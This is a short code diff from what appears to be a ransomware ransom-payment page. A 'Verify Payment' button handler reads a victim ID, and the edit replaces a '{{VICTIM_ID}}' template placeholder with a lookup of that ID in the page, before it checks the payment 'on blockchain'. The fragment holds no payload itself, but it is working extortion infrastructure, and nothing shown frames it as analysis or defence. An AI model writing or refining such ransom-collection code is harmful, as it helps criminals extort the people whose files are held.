@@ -108,7 +108,7 @@
         document.getElementById('btnVerifyPayment').addEventListener('click', async () => {
             const btn = document.getElementById('btnVerifyPayment');
             const status = document.getElementById('paymentStatus');
-            const victimId = '{{VICTIM_ID}}';
+            const victimId = document.getElementById('victimId').textContent.trim();
             
             btn.disabled = true;
             btn.textContent = "Verifying on blockchain...";
